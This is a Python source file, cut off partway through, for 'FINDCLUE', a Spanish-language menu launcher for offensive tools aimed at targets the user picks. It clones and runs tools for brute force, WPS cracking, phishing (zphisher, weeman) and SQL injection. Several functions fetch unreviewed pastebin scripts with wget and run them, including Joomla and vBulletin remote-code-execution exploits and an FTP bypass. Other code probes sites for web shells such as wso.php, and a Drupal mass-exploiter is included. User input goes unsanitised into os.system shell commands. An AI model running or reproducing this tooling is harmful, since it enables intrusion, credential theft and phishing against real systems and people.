#!/usr/bin/env python
#
#
#                 _____ _   __   _   ____     ____ _     _    _  _____
#                /  __// \ /  \ | \ |  _ \   / __/| |   | |  | |/  __/
#                | |__ | | | \ \| | | | \ \ / /   | |   | |  | || |__
#                |  _/ | | | |\ | | | |  | | |    | |   | |  | ||  _/
#                | |   | | | | \  | | |_/ / \ \___| |___\ \__/ /| |__
#                |_|   \_/ \_|  \_/ |____/   \___/|____/ \____/ \____/
#
#
#

import os
import random
import re
import socket
import sys
import time
import urllib
from platform import system
from urllib.parse import urlparse
from urllib.request import urlopen

#from urlparse import urlparse
##########################
os.system('clear')


class color:
    HEADER = '\033[95m'
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'
    LOGGING = '\33[34m'

def menu():
    print ("""

Copyright (c) 2023 FINDCLUE

Por la presente se concede permiso, sin cargo alguno, a cualquier persona que obtenga una copia
de este software y de los archivos de documentación asociados (el "Software"), a comerciar
el Software sin restricción alguna, incluidos, entre otros, los derechos de
de utilizar, copiar, modificar, fusionar, publicar, distribuir, sublicenciar y/o vender
sublicenciar y/o vender copias del Software, y a permitir que las personas a las que se
el Software, con sujeción a las siguientes condiciones:

El aviso de copyright anterior y este aviso de permiso se incluirán en todas las
copias o partes sustanciales del Software.

EL SOFTWARE SE SUMINISTRA "TAL CUAL", SIN GARANTÍAS DE NINGÚN TIPO, EXPRESAS O IMPLÍCITAS.
IMPLÍCITA, INCLUIDAS, ENTRE OTRAS, LAS GARANTÍAS DE COMERCIABILIDAD
IDONEIDAD PARA UN FIN DETERMINADO Y NO INFRACCIÓN. EN NINGÚN CASO
AUTORES NI LOS TITULARES DE LOS DERECHOS DE AUTOR SERÁN RESPONSABLES DE NINGUNA RECLAMACIÓN
RESPONSABILIDAD, YA SEA CONTRACTUAL, EXTRACONTRACTUAL O DE OTRO TIPO, DERIVADA DE,
DE O EN CONEXIÓN CON EL SOFTWARE O EL USO U OTRAS OPERACIONES CON EL
SOFTWARE.
""")


os.system('clear')
os.system('clear')
os.system('clear')
os.system('clear')

directories = ['/uploads/', '/upload/', '/files/', '/resume/', '/resumes/', '/documents/', '/docs/', '/pictures/', '/file/', '/Upload/', '/Uploads/', '/Resume/', '/Resume/', '/UsersFiles/', '/Usersiles/', '/usersFiles/', '/Users_Files/', '/UploadedFiles/',
               '/Uploaded_Files/', '/uploadedfiles/', '/uploadedFiles/', '/hpage/', '/admin/upload/', '/admin/uploads/', '/admin/resume/', '/admin/resumes/', '/admin/pictures/', '/pics/', '/photos/', '/Alumni_Photos/', '/alumni_photos/', '/AlumniPhotos/', '/users/']
shells = ['wso.php', 'shell.php', 'an.php', 'hacker.php', 'lol.php', 'up.php', 'cp.php', 'upload.php',
          'sh.php', 'pk.php', 'mad.php', 'x00x.php', 'worm.php', '1337worm.php', 'config.php', 'x.php', 'haha.php']
upload = []
yes = set(['yes', 'y', 'ye', 'Y'])
no = set(['no', 'n'])




color_random=[color.HEADER,color.IMPORTANT,color.NOTICE,color.OKBLUE,color.OKGREEN,color.WARNING,color.RED,color.END,color.UNDERLINE,color.LOGGING]
random.shuffle(color_random)
findcluelogo = color_random[0] + ''' 

                 _____ _   __   _   ____     ____ _     _    _  _____  
                /  __// \ /  \ | \ |  _ \   / __/| |   | |  | |/  __/  
                | |__ | | | \ \| | | | \ \ / /   | |   | |  | || |__   
                |  _/ | | | |\ | | | |  | | |    | |   | |  | ||  _/   
                | |   | | | | \  | | |_/ / \ \___| |___\ \__/ /| |__   
                |_|   \_/ \_|  \_/ |____/   \___/|____/ \____/ \____/  
                
                
                                Testing Framework  
                                                                                                                                                                                                                   
'''
def menu():
    print (findcluelogo + """\033[1m
   [!] Menú Principal [!]
\033[0m
   {1}--Recopilación de información
   {2}--Ataques de contraseña 
   {3}--Testing inalambrico (wireless)
   {4}--Herramientas de Exploit
   {5}--Ingeniería social
   {6}--Web Hacking
   {7}--Ataques de DDOS
   {8}--Herramientas de administrador remoto (RAT)
   {9}--Bug Bounty Tools 
   {0}--Actualizar Software
   {99}-Salir
 """)
    choice = input("Findclue >> ")
    os.system('clear')
    if choice == "1":
        info()
    elif choice == "2":
        passwd()
    elif choice == "3":
        wire()
    elif choice == "4":
        exp()
    elif choice == "5":
        social()
    elif choice == "6":
        webhack()
    elif choice == "7":
        ddos()
    elif choice == "8":
        rat()
    elif choice == "9":
        bugbounty()
    elif choice == "0":
        updateframework()
    elif choice == "99":
        clearScr(), sys.exit()
    elif choice == "":
        menu()
    else:
        menu()
        
        
def ddos():
    print('''\033[91m
                      
    88""Yb 88""Yb  dP"Yb  88b 88 888888 dP"Yb
    88__dP 88__dP dP   Yb 88Yb88   88  dP   Yb
    88"""  88"Yb  Yb   dP 88 Y88   88  Yb   dP
    88     88  Yb  YbodP  88  Y8   88   YbodP
 
    [!] ESTAS HERRAMIENTAS ESTARÁN DISPONIBLES EN LA PRÓXIMA ACTUALIZACIÓN [!]
         
 \033[0m''')
    print("  {99}-Volver al menú principal \n\n")
    choice2 = input("DDOS >> ")

    if choice2 == "99":
        clearScr()
        menu()
    elif choice2 == "":
        clearScr()
        menu()
    else:
        clearScr()
        
        
def rat():
    print('''\033[91m
                      
    88""Yb 88""Yb  dP"Yb  88b 88 888888 dP"Yb
    88__dP 88__dP dP   Yb 88Yb88   88  dP   Yb
    88"""  88"Yb  Yb   dP 88 Y88   88  Yb   dP
    88     88  Yb  YbodP  88  Y8   88   YbodP
 
    [!] ESTAS HERRAMIENTAS ESTARÁN DISPONIBLES EN LA PRÓXIMA ACTUALIZACIÓN [!]
         
 \033[0m''')
    print("  {99}-Volver al menú principal \n\n")
    choice2 = input("RAT >> ")

    if choice2 == "99":
        clearScr()
        menu()
    elif choice2 == "":
        clearScr()
        menu()
    else:
        clearScr()
    

def bugbounty():
    print('''\033[91m
                      
    88""Yb 88""Yb  dP"Yb  88b 88 888888 dP"Yb
    88__dP 88__dP dP   Yb 88Yb88   88  dP   Yb
    88"""  88"Yb  Yb   dP 88 Y88   88  Yb   dP
    88     88  Yb  YbodP  88  Y8   88   YbodP
 
    [!] ESTAS HERRAMIENTAS ESTARÁN DISPONIBLES EN LA PRÓXIMA ACTUALIZACIÓN [!]
         
 \033[0m''')
    print("  {99}-Volver al menú principal \n\n")
    choice2 = input("BugBounty >> ")

    if choice2 == "99":
        clearScr()
        menu()
    elif choice2 == "":
        clearScr()
        menu()
    else:
        clearScr()
        



def updateframework():
    print ("Esta herramienta esta disponible soló para sistemas Linux. ")
    opcion = input("Continuar Y / N: ")
    if opcion in yes:
        os.system("git clone https://github.com/Footchiken/FINDCLUE.git")
        os.system("cd FINDCLUE && sudo bash ./update.sh")
        os.system("FINDCLUE")


def doork():
    print("Doork es una herramienta de auditoría pasiva de vulnerabilidades de código abierto que automatiza el proceso de búsqueda en Google de información sobre un sitio web específico basado en dorks. ")
    doorkchice = input("Continue Y / N: ")
    if doorkchice in yes:
        os.system("pip install beautifulsoup4 && pip install requests")
        os.system("git clone https://github.com/AeonDave/doork")
        clearScr()
        doorkt = input("Target : ")
        os.system("cd doork && python doork.py -t %s -o log.log" % doorkt)



def scanusers():
    site = input('Ingrese el enlace web : ')
    try:
        users = site
        if 'http://www.' in users:
            users = users.replace('http://www.', '')
        if 'http://' in users:
            users = users.replace('http://', '')
        if '.' in users:
            users = users.replace('.', '')
        if '-' in users:
            users = users.replace('-', '')
        if '/' in users:
            users = users.replace('/', '')
        while len(users) > 2:
            print (users)
            resp = urlopen(
                site + '/cgi-sys/guestbook.cgi?user=%s' % users).read()

            if 'invalid username' not in resp.lower():
                print ("\tFound -> %s" % users)
                pass

            users = users[:-1]
    except:
        pass


def brutex():
    clearScr()
    print("Fuerza bruta automáticamente todos los servicios que se ejecutan en un objetivo: puertos abiertos /dominios DNS /nombres de usuario /contraseñas")
    os.system("git clone https://github.com/1N3/BruteX.git")
    clearScr()
    brutexchoice = input("Seleccione un objetivo : ")
    os.system("cd BruteX && chmod 777 brutex && ./brutex %s" % brutexchoice)


def arachni():
    print("Arachni es un framework Ruby modular, de alto rendimiento y con todas las funciones destinado a ayudar a los administradores y evaluadores de penetración a evaluar la seguridad de las aplicaciones web.")
    cara = input("Instalar y ejecutar ? Y / N : ")
    clearScr()
    print("exemple : http://www.target.com/")
    tara = input("Seleccione un objetivo para escanear : ")
    if cara in yes:        
        os.system("git clone git://github.com/Arachni/arachni.git")
        os.system(
            "cd arachni && sudo gem install bundler && bundle install --without prof && rake install")
        os.system("archani")
    clearScr()
    os.system("cd arachni/bin && chmod 777 arachni && ./arachni %s" % tara)


def XSStrike():
    clearScr()
    print("XSStrike es un script de Python diseñado para detectar y explotar vulnerabilidades XSS")
    os.system("sudo rm -rf XSStrike")
    os.system("git clone https://github.com/UltimateHackers/XSStrike.git && cd XSStrike && pip install -r requirements.txt && clear && python xsstrike")


def crips():
    clearScr()
    os.system("git clone https://github.com/Manisso/Crips.git")
    os.system("cd Crips && sudo bash ./update.sh")
    os.system("crips")
    os.system("clear")


def weeman():
    print("HTTP server for phishing in python. (and framework) Usually you will want to run Weeman with DNS spoof attack. (see dsniff, ettercap).")
    choicewee = input("Install Weeman ? Y / N : ")
    if choicewee in yes:
        os.system(
            "git clone https://github.com/samyoyo/weeman.git && cd weeman && python weeman.py")
    if choicewee in no:
        menu()
    else:
        menu()


def gabriel():
    print("Autenticación bypass de Open&Compact (Gabriel's)")
    os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
    clearScr()
    os.system("python gabriel.py")
    ftpbypass = input("Ingrese la IP de destino y use el comando :")
    os.system("python gabriel.py %s" % ftpbypass)


def sitechecker():
    os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
    clearScr()
    os.system("python ch01.py")


def h2ip():
    host = input("Seleccione el Host : ")
    ips = socket.gethostbyname(host)
    print(ips)


def ports():
    clearScr()
    target = input('Seleccione una IP de destino : ')
    os.system("nmap -O -Pn %s" % target)
    sys.exit()


def ifinurl():
    print(""" Esta búsqueda avanzada en motores de búsqueda permite el análisis proporcionado para exploits GET/POST capturando correos electrónicos y URL, con una unión de validación interna personalizada para cada destino/URL encontrada.""")
    print('Desea instalar InurlBR ? ')
    cinurl = input("Y/N: ")
    if cinurl in yes:
        inurl()
    if cinurl in no:
        menu()
    elif cinurl == "":
        menu()
    else:
        menu()


def bsqlbf():
    clearScr()
    print("Esta herramienta sólo funcionará en inyección ciega SQL")
    cbsq = input("seleccione un objetivo : ")
    os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
    os.system("perl bsqlbf.pl -url %s" % cbsq)
    os.system("rm bsqlbf.pl")


def atscan():
    print ("Desea installar ATSCAN ?")
    choiceshell = input("Y/N: ")
    if choiceshell in yes:
        os.system("sudo rm -rf ATSCAN")
        os.system(
            "git clone https://github.com/AlisamTechnology/ATSCAN.git && cd ATSCAN && perl atscan.pl")
    elif choiceshell in no:
        os.system('clear')
        menu()


def commix():
    print ("Herramienta automatizada de inyección y explotación de comandos del sistema operativo, todo en uno.")
    print ("usar : python commix.py --help")
    choicecmx = input("Continuar: y/n :")
    if choicecmx in yes:
        os.system("git clone https://github.com/stasinopoulos/commix.git commix")
        os.system("cd commix")
        os.system("python commix.py")
        os.system("")
    elif choicecmx in no:
        os.system('clear')
        info()


def pixiewps():
    print("""Pixiewps es una herramienta escrita en C que se utiliza para aplicar fuerza bruta fuera de línea al pin WPS aprovechando la entropía baja o inexistente de algunos puntos de acceso, el llamado "pixie dust attack" descubierto por Dominique Bongard en el verano de 2014. Está destinado solo a fines educativos.
    """)
    choicewps = input("Continuar ? Y/N : ")
    if choicewps in yes:
        os.system("git clone https://github.com/wiire/pixiewps.git")
        os.system("cd pixiewps & make ")
        os.system("sudo make install")
    if choicewps in no:
        menu()
    elif choicewps == "":
        menu()
    else:
        menu()


def webhack():
    print('''\033[91m
          
    Yb        dP 888888 88""Yb
     Yb  db  dP  88__   88__dP
      YbdPYbdP   88""   88""Yb
       YP  YP    888888 88oodP
    
     [!] Herramientas de Hacking Web [!]
         
 \033[0m''')
    print("   {1}--Drupal Hacking ")
    print("   {2}--Inurlbr")
    print("   {3}--Wordpress & Joomla escaner")
    print("   {4}--Escáner de formularios por gravedad")
    print("   {5}--Wordpress Exploit escaner")
    print("   {6}--Buscador de directorios y Shell")
    print("   {7}--Joomla! 1.5 - 3.4.5 ejecución remota de código")
    print("   {8}-Vbulletin 5.X ejecución remota de código")
    print(
        "   {9}-BruteX - Fuerza bruta automática en todos los servicios que se ejecutan dentro de un objetivo")
    print("   {10}-Arachni - Framework de análisis de seguridad en aplicaciones web \n ")
    print("   {99}-volver al menú principal \n")
    choiceweb = input("Web >> ")
    if choiceweb == "1":
        clearScr()
        maine()
    if choiceweb == "2":
        clearScr()
        ifinurl()
    if choiceweb == '3':
        clearScr()
        wppjmla()
    if choiceweb == "4":
        clearScr()
        gravity()
    if choiceweb == "5":
        clearScr()
        wpminiscanner()
    if choiceweb == "6":
        clearScr()
        shelltarget()
    if choiceweb == "7":
        clearScr()
        joomlarce()
    if choiceweb == "8":
        clearScr()
        vbulletinrce()
    if choiceweb == "9":
        clearScr()
        brutex()
    if choiceweb == "10":
        clearScr()
        arachni()
    elif choiceweb == "99":
        clearScr()
        menu()
    elif choiceweb == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def vbulletinrce():
    os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
    os.system("perl tmp.pl")


def joomlarce():
    os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
    clearScr()
    print("si la respuesta es 200, encontrará su shell en Joomla_3.5_Shell.txt")
    jmtarget = input("Select a targets list :")
    os.system("python temp.py %s" % jmtarget)


def inurl():
    dork = input("seleccione un Dork:")
    output = input("seleccione un archivo para guardar :")
    os.system(
        "./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
    if inurl in no:
        insinurl()
    elif inurl == "":
        menu()
    else:
        menu()


def insinurl():
    os.system("git clone https://github.com/googleinurl/SCANNER-INURLBR.git")
    os.system("chmod +x SCANNER-INURLBR/inurlbr.php")
    os.system("apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl")
    os.system("mv /SCANNER-INURLBR/inurbr.php inurlbr.php")
    clearScr()
    inurl()


def nmap():

    choice7 = input("continuar ? Y / N : ")
    if choice7 in yes:
        os.system("git clone https://github.com/nmap/nmap.git")
        os.system("cd nmap && ./configure && make && make install")
    elif choice7 in no:
        info()
    elif choice7 == "":
        menu()
    else:
        menu()


def jboss():
    os.system('clear')
    print ("Este script JBoss implementa un shell JSP en el servidor JBoss AS de destino. Una vez")
    print ("implementado, el script utiliza su capacidad de carga y ejecución de comandos para")
    print ("proporcionar una sesión interactiva.")
    print ("")
    print ("usar : ./e.sh target_ip tcp_port ")
    print("Continuar: y/n")
    choice9 = input("yes / no :")
    if choice9 in yes:
        os.system(
            "git clone https://github.com/SpiderLabs/jboss-autopwn.git"), sys.exit()
    elif choice9 in no:
        os.system('clear')
        exp()
    elif choice9 == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def sqlmap():
    print ("usar : python sqlmap.py -h")
    choice8 = input("Continuar: y/n :")
    if choice8 in yes:
        os.system(
            "git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
    elif choice8 in no:
        os.system('clear')
        info()
    elif choice8 == "":
        menu()
    else:
        menu()


def grabuploadedlink(url):
    try:
        for dir in directories:
            currentcode = urllib.urlopen(url + dir).getcode()
            if currentcode == 200 or currentcode == 403:
                print ("-------------------------")
                print ("  [ + ] Found Directory :  " + str(url + dir) + " [ + ]")
                print ("-------------------------")
                upload.append(url + dir)
    except:
        pass


def grabshell(url):
    try:
        for upl in upload:
            for shell in shells:
                currentcode = urllib.urlopen(upl + shell).getcode()
                if currentcode == 200:
                    print ("-------------------------")
                    print ("  [ ! ] Found Shell :  " + str(upl + shell) + " [ ! ]")
                    print ("-------------------------")
    except:
        pass


def shelltarget():
    print("ejemplo : http://target.com")
    line = input("Ingrese enlace : ")
    line = line.rstrip()
    grabuploadedlink(line)
    grabshell(line)


def setoolkit():
    print ("The Social-Engineer Toolkit es un framework de penetración de código abierto")
    print(" diseñado para ingeniería social. SET tiene una serie de vectores de ataque personalizados que ")
    print(" te permitirá realizar un ataque creíble rápidamente. SET es un producto de TrustedSec, LLC  ")
    print("una empresa de consultoría de seguridad de la información ubicada en Cleveland, Ohio.")
    print("")

    choiceset = input("y / n :")
    if choiceset in yes:
        os.system(
            "git clone https://github.com/trustedsec/social-engineer-toolkit.git")
        os.system("python social-engineer-toolkit/setup.py")
    if choiceset in no:
        clearScr()
        info()
    elif choiceset == "":
        menu()
    else:
        menu()

def cupp():
    print("cupp es un generador de listas para contraseñas ")
    print("Usar: python cupp.py -h")
    choicecupp = input("Continue: y/n : ")

    if choicecupp in yes:
        os.system("git clone https://github.com/Mebus/cupp.git")
        print("archivo descargado exitosamente")
    elif choicecupp in no:
        clearScr()
        passwd()
    elif choicecupp == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def ncrack():
    print("Una interfaz Ruby para Ncrack, herramienta para descifrar la autenticación de red.")
    print("requiere : nmap >= 0.3ALPHA / rprogram ~> 0.3")
    print("Continuar: y/n")
    choicencrack = input("y / n :")
    if choicencrack in yes:
        os.system("git clone https://github.com/sophsec/ruby-ncrack.git")
        os.system("cd ruby-ncrack")
        os.system("install ruby-ncrack")
    elif choicencrack in no:
        clearScr()
        passwd()
    elif choicencrack == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def reaver():
    print ("""
      Reaver ha sido diseñado para ser un ataque fuerte y práctico contra la configuración protegida de Wi-Fi
      PIN de registrador de WPS para recuperar contraseñas WPA/WPA2. Ha sido probado contra un
      amplia variedad de puntos de acceso e implementaciones WPS.
      1 para aceptar / 0 para rechazar
        """)
    creaver = input("y / n :")
    if creaver in yes:
        os.system(
            "apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps")
        os.system("git clone https://github.com/t6x/reaver-wps-fork-t6x.git")
        os.system("cd reaver-wps-fork-t6x/src/ & ./configure")
        os.system("cd reaver-wps-fork-t6x/src/ & make")
    elif creaver in no:
        clearScr()
        wire()
    elif creaver == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):

    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib.URLError:
            pass

    final = unique(lista)
    return final


def check_gravityforms(sites):
    import urllib
    gravityforms = []
    for site in sites:
        try:
            if urllib.urlopen(site + 'wp-content/plugins/gravityforms/gravityforms.php').getcode() == 403:
                gravityforms.append(site)
        except:
            pass

    return gravityforms


def gravity():
    ip = input('Ingrese la dirección IP : ')
    sites = bing_all_grabber(str(ip))
    gravityforms = check_gravityforms(sites)
    for ss in gravityforms:
        print (ss)

    print ('\n')
    print ('[*] Resultado, ', len(gravityforms), ' gravityforms.')


def shellnoob():
    print ("""Escribir shellcodes siempre ha sido muy divertido, pero algunas partes son extremadamente aburridas y propensas a errores. ¡Concéntrate sólo en la parte divertida y utiliza ShellNoob!""")
    cshell = input("Y / N : ")
    if cshell in yes:
        os.system("git clone https://github.com/reyammer/shellnoob.git")
        os.system("mv shellnoob/shellnoob.py shellnoob.py")
        os.system("sudo python shellnoob.py --install")
    if cshell in no:
        exp()
    elif cshell == "":
        menu()
    else:
        menu()


def info():

    print('''\033[91m
          
    88 88b 88 888888  dP"Yb
    88 88Yb88 88__   dP   Yb
    88 88 Y88 88""   Yb   dP
    88 88  Y8 88      YbodP
    
[!] Herramientas de recopilación de información [!]
         
 \033[0m''')
    print("  {1}--Nmap ")
    print("  {2}--Setoolkit")
    print("  {3}--Escaneo de puertos")
    print("  {4}--Host To IP")
    print("  {5}--wordpress user")
    print("  {6}--CMS scanner")
    print("  {7}--XSStrike")
    print("  {8}--Dork ")
    print("  {9}--Scan A server's Users  ")
    print("  {10}-Crips\n  ")
    print("  {99}-Regresar al menú principal \n\n")
    choice2 = input("InformationG. >> ")
    if choice2 == "1":
        os.system('clear')
        nmap()
    if choice2 == "2":
        clearScr()
        setoolkit()
    if choice2 == "3":
        clearScr()
        ports()
    if choice2 == "4":
        clearScr()
        h2ip()
    if choice2 == "5":
        clearScr()
        wpue()
    if choice2 == "6":
        clearScr()
        cmsscan()
    if choice2 == "7":
        clearScr()
        XSStrike()
    if choice2 == "8":
        clearScr()
        doork()
    if choice2 == "10":
        clearScr()
        crips()
    elif choice2 == "99":
        clearScr()
        menu()
    if choice2 == "9":
        clearScr()
        scanusers()
    elif choice2 == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()
        
        



def cmsscan():
    os.system("git clone https://github.com/Dionach/CMSmap.git")
    clearScr()
    xz = input("seleccione un objetivo : ")
    os.system("cd CMSmap @@ sudo cmsmap.py %s" % xz)


def wpue():
    os.system("git clone https://github.com/wpscanteam/wpscan.git")
    clearScr()
    xe = input("Seleccione el Wordpress : ")
    os.system("cd wpscan && sudo ruby wpscan.rb --url %s --enumerate u" % xe)


#def priv8():
#    dzz()


def androidhash():
    key = input("Ingrese el hash de Android : ")
    salt = input("Ingrese el Android salt : ")
    os.system("git clone https://github.com/PentesterES/AndroidPINCrack.git")
    os.system(
        "cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s" % (key, salt))


def passwd():
    print('''\033[91m
                               
    88""Yb    db    .dP"Y8 .dP"Y8 Yb        dP 8888b.
    88__dP   dPYb   `Ybo." `Ybo."  Yb  db  dP   8I  Yb
    88"""   dP__Yb  o.`Y8b o.`Y8b   YbdPYbdP    8I  dY
    88     dP""""Yb 8bodP' 8bodP'    YP  YP    8888Y"   

    [!] Ataques de contraseña [!]
         
 \033[0m''')
    print("   {1}--Cupp ")
    print("   {2}--Ncrack \n ")

    print("   {99}-Regresar al menu principal \n")
    choice3 = input("Passwd >> ")
    if choice3 == "1":
        clearScr()
        cupp()
    elif choice3 == "2":
        clearScr()
        ncrack()
    elif choice3 == "99":
        clearScr()
        menu()
    elif choice3 == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def bluepot():
    print("necesitas tener al menos 1 receptor bluetooh (si tienes muchos, también funcionará con ellos). Debes instalar /libbluetooth-dev en Ubuntu /bluez-libs-devel en Fedora/bluez-devel en openSUSE ")
    choice = input("Continuar ? Y / N : ")
    if choice in yes:
        os.system("wget https://github.com/andrewmichaelsmith/bluepot/raw/master/bin/bluepot-0.1.tar.gz && tar xfz bluepot-0.1.tar.gz && sudo java -jar bluepot/BluePot-0.1.jar")
    else:
        menu()
	
#def fluxion():
#    print("fluxion es un descifrador de claves wifi que utiliza un ataque gemelo malvado... necesitas un adoptante inalámbrico para esta herramienta.")
#    choice = input("Continuar ? Y / N : ")
#    if choice in yes:
#        os.system("git clone https://github.com/thehackingsage/Fluxion.git")
#	os.system("cd Fluxion && cd install && sudo chmod +x install.sh && sudo ./install.sh")
#	os.system("cd .. && sudo chmod +x fluxion.sh && sudo ./fluxion.sh")
#    elif choice in no:
#	clearScr()
#	wire()
#    else:
#        menu()
	
def wire():
    print('''\033[91m
          
    Yb        dP 88 88""Yb 888888 88     888888 .dP"Y8 .dP"Y8
     Yb  db  dP  88 88__dP 88__   88     88__   `Ybo." `Ybo."
      YbdPYbdP   88 88"Yb  88""   88  .o 88""   o.`Y8b o.`Y8b
       YP  YP    88 88  Yb 888888 88ood8 888888 8bodP' 8bodP'
    
      [!] Testing inalambrico [!]
         
 \033[0m''')
    print("   {1}--reaver ")
    print("   {2}--pixiewps")
    print("   {3}--Bluetooth Honeypot GUI Framework")
    print("   {4}--Fluxion\n")
    print("   {99}-Volver al menu principal \n\n")
    choice4 = input("Wireless >> ")
    if choice4 == "1":
        clearScr()
        reaver()
    if choice4 == "2":
        clearScr()
        pixiewps()
    if choice4 == "3":
        clearScr()
        bluepot()
 #   if choice4 == "4":
 #       clearScr()
 #       fluxion()
    
    elif choice4 == "99":
        clearScr()
        menu()
    elif choice4 == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def exp():
    print('''\033[91m
              
    888888 Yb  dP 88""Yb 88      dP"Yb  88 888888 
    88__    YbdP  88__dP 88     dP   Yb 88   88   
    88""    dPYb  88"""  88  .o Yb   dP 88   88   
    888888 dP  Yb 88     88ood8  YbodP  88   88   

    [!] Herramientas de exploit [!]
         
 \033[0m''')
    print("   {1}--ATSCAN")
    print("   {2}--sqlmap")
    print("   {3}--Shellnoob")
    print("   {4}--commix")
    print("   {5}--FTP Auto Bypass")
    print("   {6}--jboss-autopwn")
    print("   {7}--Inyección automatica SQL y Exploit")
    print("   {8}--Fuerza bruta en el código de acceso de Android dado el hash y el salt")
    print("   {9}--Joomla SQL inyección escáner \n ")
    print("   {99}-Volver al menú principal \n\n")
    choice5 = input("Exploitation >> ")
    if choice5 == "2":
        clearScr()
        sqlmap()
    if choice5 == "1":
        os.system('clear')
        atscan()
    if choice5 == "3":
        clearScr()
        shellnoob()
    if choice5 == "4":
        os.system("clear")
        commix()
    if choice5 == "5":
        clearScr()
        gabriel()
    if choice5 == "6":
        clearScr()
        jboss()
    if choice5 == "7":
        clearScr()
        bsqlbf()
    if choice5 == "8":
        clearScr()
        androidhash()
    if choice5 == "9":
        clearScr()
        cmsfew()
    elif choice5 == "99":
        clearScr()
        menu()
    elif choice5 == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def social():
    print('''\033[91m
              
    .dP"Y8  dP"Yb   dP""b8 88    db    88     
    `Ybo." dP   Yb dP   `" 88   dPYb   88     
    o.`Y8b Yb   dP Yb      88  dP__Yb  88  .o 
    8bodP'  YbodP   YboodP 88 dP""""Yb 88ood8 

    [!] Herramientas de ingeniería social [!]
         
 \033[0m''')
    print("   {1}--Setoolkit ")
    print("   {2}--pyPISHER")
    print("   {3}--ZPISHER")
    #print("   {4}--SMTP Mailer \n ")
    print("   {99}-Volver al menú principal \n\n")
    choice6 = input("SocialEngineering >> ")
    if choice6 == "1":
        clearScr()
        setoolkit()
    if choice6 == "2":
        clearScr()
        pisher()
    if choice6 == "3":
        clearScr()
        zpisher()
    #if choice6 == "4":
        #clearScr()
        #smtpsend()
    if choice6 == "99":
        clearScr()
        menu()
    elif choice6 == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def cmsfew():
    print("Tú objetivo debe ser Joomla, Mambo, PHP-Nuke, y XOOPS solamente ")
    target = input("Selecciona un objetivo : ")
    os.system(
        "wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
    os.system("python cms.py %s" % target)


def smtpsend():
    os.system("wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py")
    clearScr()
    os.system("python smtp.py")


def pisher():
    os.system("wget http://pastebin.com/raw/DDVqWp4Z --output-document=pisher.py")
    clearScr()
    os.system("python pisher.py")


def zpisher():
    print('''\033[91m
                  
    8888P 88""Yb 88  88 88 .dP"Y8 88  88 888888 88""Yb 
      dP  88__dP 88  88 88 `Ybo." 88  88 88__   88__dP 
     dP   88"""  888888 88 o.`Y8b 888888 88""   88"Yb  
    d8888 88     88  88 88 8bodP' 88  88 888888 88  Yb 
 
    [!] Herramienta de ZPhisher [!]
         
 \033[0m''')
    print("   {1}--Kali Linux ")
    print("   {2}--Termux")
    print("   {99}-Volver al menú pricipal \n")
    choiceweb = input("ZPhisher~# ")
    if choiceweb == "1":
        clearScr()
        zpishkali()
    if choiceweb == "2":
        clearScr()
        zpishtermux()
    elif choiceweb == "99":
        clearScr()
        social()
    elif choiceweb == "":
        clearScr()
        social()
    else:
        clearScr()
        social()


def zpishkali():
    os.system("git clone https://github.com/htr-tech/zphisher.git")
    os.system("cd zphisher && bash zphisher.sh")
    clearScr()
    social()
    
def zpishtermux():
    os.system("pkg install tur-repo")
    os.system("pkg install zphisher && zphisher")
    clearScr()
    social()

def unique(seq):
    """
    get unique from list found it on stackoverflow
    """
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def clearScr():
    """
    borrar la pantalla en caso GNU/Linux or
    windows
    """
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')




############################
minu = '''
\t 1: Drupal Bing Exploiter
\t 2: Obtener sitios web Drupal
\t 3: Explotador masivo de Drupal
\t 99: Volver al menú
'''


def drupal(user=None, pwd=None):
    '''Drupal Exploit Binger All Websites Of server '''
    ip = input('1- IP : ')
    page = 1
    while page <= 50:

        url = "http://www.bing.com/search?q=ip%3A" + ip + "&go=Valider&qs=n&form=QBRE&pq=ip%3A" + \
            ip + "&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first=" + \
            str(page)
        req = urllib.Request(url)
        opreq = urllib.urlopen(req).read()
        findurl = re.findall(
            '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
        page += 1

        for url in findurl:
            try:

                urlpa = urlparse(url)
